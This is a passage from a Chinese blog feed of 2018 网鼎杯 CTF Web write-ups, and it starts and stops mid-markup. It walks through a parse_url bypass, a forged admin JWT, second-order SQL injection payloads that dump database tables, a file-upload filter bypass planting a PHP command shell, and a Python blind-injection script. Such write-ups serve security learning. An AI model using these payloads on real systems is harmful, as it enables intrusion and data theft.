class="line">$uri = <span class="string">"http://"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$host = parse_url($uri,PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($host === <span class="string">"c7f.zhuque.com"</span>)&#123;</span><br><span class="line">setcookie(<span class="string">"AuthFlag"</span>,<span class="string">"flag&#123;***&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源代码看出，要绕过stripos函数的检测，首先我们要弄清楚全局变量$_SERVER[‘REQUEST_URI’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见返回的是url中/后面的内容</p><p>parse_url函数作用是截取url中的指定部分，PHP_URL_HOST是截取url中的主机信息部分</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url, PHP_URL_SCHEME));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_USER));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PASS));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_HOST));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PORT));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PATH));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_QUERY));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_FRAGMENT));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出parse_url($url, PHP_URL_HOST)截取的是@后面的hostname</p><p>最后要获取flag条件是截取的hostname等于c7f.zhuque.com，所以构造payload:<a href="mailto:.@c7f.zhuque.com" target="_blank" rel="noopener">.@c7f.zhuque.com</a>/..//</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最前面的.是为了绕过stripos函数，位置为0就不会执行die函数</p><p>本地测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$uri = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$uri = '</span>.$uri.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(stripos($uri,<span class="string">"."</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Unknow URI."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'stripos($uri,".") = '</span>.stripos($uri,<span class="string">"."</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"parse_url($uri,PHP_URL_HOST) = "</span>.parse_url($uri,PHP_URL_HOST).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!parse_url($uri,PHP_URL_HOST))&#123;</span><br><span class="line">$uri = <span class="string">"http://"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$uri = '</span>.$uri.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$host = parse_url($uri,PHP_URL_HOST);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$host = '</span>.$host.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($host === <span class="string">"c7f.zhuque.com"</span>)&#123;</span><br><span class="line">setcookie(<span class="string">"AuthFlag"</span>,<span class="string">"flag&#123;***&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后加上../是为了回到根目录，再加个/就等于回到localhost/</p><h3 id="gold"><a href="#gold" class="headerlink" title="gold"></a>gold</h3><p>题目：还在上小学的小明同学开发了一款游戏，你能通关吗？ </p><p><img src="/img/网鼎杯第三场Web/4.png" alt=""></p><p>抓包发现不断POST参数getGod，值从0开始叠加，图片显示收集1000金币就可以通关，就猜测可能POST参数getGod从0到1001就可以得到flag</p><p>利用burp的intruder模块发送参数getGod，值从0到1001</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现getGod=1001的响应包中显示了flag</p><p>PS：这关有防作弊机制，必须单线程的POST参数getGod从0到1001，否则就弹出防作弊的提示框</p><h3 id="i-am-admin"><a href="#i-am-admin" class="headerlink" title="i_am_admin"></a>i_am_admin</h3><p>题目：你能登录进去吗？ </p><p>一个登录界面，貌似要以admin身份才能获得flag</p><p>给出了提示We have prepare a test account for you to login; Username:Passwd = test:test  </p><p>以test身份登录</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>抓取登录数据包，发现登录时在cookie字段设置了auth字段</p><p>获得信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome back test user, although i can&apos;t give u flag, but i will give u my SECRET:uy8qz-!kru%*2h7$q&amp;veq=y_r1abu-xd_219y%phex!@4hv62+</span><br></pre></td></tr></table></figure><p>查询得知是JWT，JWT具体介绍参考下面链接</p><p><a href="https://blog.csdn.net/qq_40081976/article/details/79046825" target="_blank" rel="noopener">https://blog.csdn.net/qq_40081976/article/details/79046825</a></p><p>到<a href="https://jwt.io/解码" target="_blank" rel="noopener">https://jwt.io/解码</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录test身份设置了auth字段，值就是JWT加密后的值，那么我们可以抓包在cookie添加auth字段，值为admin的JWT值，即eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.NYSsNZ1gR8EUYebNTmXPBhdoh-mA5OjHkeWjM4gPxqY</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="phone"><a href="#phone" class="headerlink" title="phone"></a>phone</h3><p>题目：find the flag</p><p>有登录和注册的页面，试着注册账号test1,密码123,电话123</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回index.php页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>点击查询得到：有1人和你电话相似哦~ </p><p>猜测存在二次注入，根据我们注册用户的电话号码执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> telephone=<span class="string">'123'</span>;</span><br></pre></td></tr></table></figure><p>我们再注册账号，密码123，电话123’#</p><p>这里电话号码必须是数字，我们可以将字符串转化为十六进制</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在本地数据库测试一下</p><p>先创建表tel</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tel</span><br><span class="line">(</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">telphone <span class="built_in">varchar</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tel <span class="keyword">values</span>(<span class="string">'test1'</span>,<span class="string">'123'</span>,<span class="string">'123'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tel <span class="keyword">values</span>(<span class="string">'test2'</span>,<span class="string">'123'</span>,<span class="string">"123#'"</span>);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们的注入点就在注册POST的phone参数，也就是电话号码</p><p>首先爆库，payload:123’ union select database() order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>库名为test</p><p>这里末尾加上order by 1 desc是为了将结果倒序</p><p>直接在数据库测试简单明了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果不加order by，那么就只会显示查询的第一行结果1，如果我们将结果倒序处理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么就显示了我们注入的结果</p><p>继续爆表，payload:123’ union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为flag,user</p><p>爆flag表下的列名，payload:123’ union select group_concat(column_name) from information_schema.columns where table_name=’flag’ order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为f14g</p><p>爆f14g列下数据，payload:123’ union select group_concat(f14g) from flag order by 1 desc#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p>]]></content>
    
    <summary type="html">
    
      ctf-Web
    
    </summary>
    
      <category term="ctf-Web" scheme="https://Foxgrin.github.io/categories/ctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯第二场Web</title>
    <link href="https://Foxgrin.github.io//posts/47793/"/>
    <id>https://Foxgrin.github.io//posts/47793/</id>
    <published>2018-08-22T15:02:00.000Z</published>
    <updated>2018-09-04T13:24:19.920Z</updated>
    
    <content type="html"><![CDATA[<p>2018年网鼎杯第二场Web题解<a id="more"></a></p><h3 id="wafUpload"><a href="#wafUpload" class="headerlink" title="wafUpload"></a>wafUpload</h3><p>源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES[&apos;file&apos;])) &#123;</span><br><span class="line">    #mime check</span><br><span class="line">    if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This type is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #check filename</span><br><span class="line">    $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;];</span><br><span class="line">    if (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(&apos;.&apos;, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) &#123;</span><br><span class="line">        die(&apos;This file is not allowed!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br><span class="line">    if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) &#123;</span><br><span class="line">        echo &apos;Success!&apos;;</span><br><span class="line">        echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &apos;Failed!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__file__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>一道有过滤的文件上传题，首先过滤的是文件的类型，修改上传类型为[‘image/jpeg’, ‘image/png’, ‘image/gif’]数组中任一一个元素即可，接下来将数组$file的最后一个元素取出判断是否是[‘jpg’, ‘png’, ‘gif’]中的任一元素，如果不是则退出程序，最终上传的文件名为”数组$file的第一个元素.$file[count($file) - 1]”，我们知道如果是一个完整的数组，那么$file[count($file) - 1]一定是数组的最后一个元素，而上面又将最后一个元素规定为jpg或png或gif，而我们的目的是上传一个php文件，那么后缀名一定是要.php，那么我们就可以上传一个不完整的数组，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">0</span>] = <span class="string">'demo.php'</span>;</span><br><span class="line">$file[<span class="number">10</span>] = <span class="string">'jpg'</span>;</span><br><span class="line"><span class="keyword">echo</span> $file[count($file) - <span class="number">1</span>]; <span class="comment">//NULL</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$filename = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> $filename; <span class="comment">//demo.php.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以成功上传一个php文件，但是我们最终得到的文件名最后还有一个’.’，所以我们将$file[0]=demo.php/</p><p>这样最终得到demo.php/.</p><p>burp抓包修改</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>文件成功上传</p><p>访问url/upload/85ed06a27b8eb105c27cbc380822ede8/demo.php/.</p><p>抓包POST参数cmd任意执行命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现flag</p><p>读取</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>首先来到的页面时login.php，没有其他提示，扫一下后台，发现register.php，</p><p>是一个注册页面，我们试着注册一个用户后登录，这里通过抓包发现注册成功后会返回302状态码重定向到login.php，否则返回200状态码回到register.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以发现，登录后又重定向到index.php，其中只有显示了用户名</p><p>有注册页面，有登录页面，很明显的存在sql查询，那么可以猜测注册页面的sql语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'$username'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><p>如果执行成功，则注册成功，重定向到login.php，然后执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'$username'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><p>有查询结果则登录成功，返回查询结果的用户名信息</p><p>那么我们就可以推测这里存在二次注入，我们在register.php中的insert语句注入username，在index.php中显示注入的结果，这就是二次注入</p><p>接下来考虑insert注入</p><p>直接给出我的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+ascii(substr((select database()) from 1 for 1))+&apos;0</span><br></pre></td></tr></table></figure><p>这样sql语句就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">tables</span> <span class="keyword">values</span>(<span class="string">'$email'</span>,<span class="string">'0'</span>+<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))+<span class="string">'0'</span>,<span class="string">'$password'</span>)</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第二场Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>本地数据库测试可行</p><p>那么接下来就是写脚本注入了</p><p>附上我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/register.php"</span></span><br><span class="line">login_url = <span class="string">"http://7144aea59c434409842c039e28cd3bc31fcff0f7dcb04f5b.game.ichunqiu.com/login.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i),</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">"0'+ascii(substr((select database()) from %d for 1))+'0"</span>%i,</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=register_url,data=register_data)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i),</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=login_url,data=login_data)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;'</span>,r.text)</span><br><span class="line">    asc = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> asc == <span class="string">'0'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database = database + chr(int(asc))</span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br><span class="line"><span class="comment">#获取表名</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,20):</span></span><br><span class="line"><span class="string">    register_data = &#123;</span></span><br><span class="line"><span class="string">        'email':'test@test'+ str(i),</span></span><br><span class="line"><span class="string">        'username':"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0"%i,</span></span><br><span class="line"><span class="string">        'password':123</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    r = requests.post(url=register_url,data=register_data)</span></span><br><span class="line"><span class="string">    print(r.text)</span></span><br><span class="line"><span class="string">    login_data = &#123;</span></span><br><span class="line"><span class="string">        'email':'test@test'+ str(i),</span></span><br><span class="line"><span class="string">        'password':123</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    r = requests.post(url=login_url,data=login_data)</span></span><br><span class="line"><span class="string">    r.encoding = r.apparent_encoding</span></span><br><span class="line"><span class="string">    print(r.text)</span></span><br><span class="line"><span class="string">    match = re.search(r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;',r.text)</span></span><br><span class="line"><span class="string">    asc = match.group(1)</span></span><br><span class="line"><span class="string">    if asc == '0':</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">    table_name = table_name + chr(int(asc))</span></span><br><span class="line"><span class="string">print('table_name:',table_name)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i) + str(i),</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">"0'+ascii(substr((select * from flag) from %d for 1))+'0"</span>%i,</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=register_url,data=register_data)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:<span class="string">'test@test'</span>+ str(i) + str(i),</span><br><span class="line">        <span class="string">'password'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url=login_url,data=login_data)</span><br><span class="line">    match = re.search(<span class="string">r'&lt;span class="user-name"&gt;\s*(\d*)\s*&lt;/span&gt;'</span>,r.text)</span><br><span 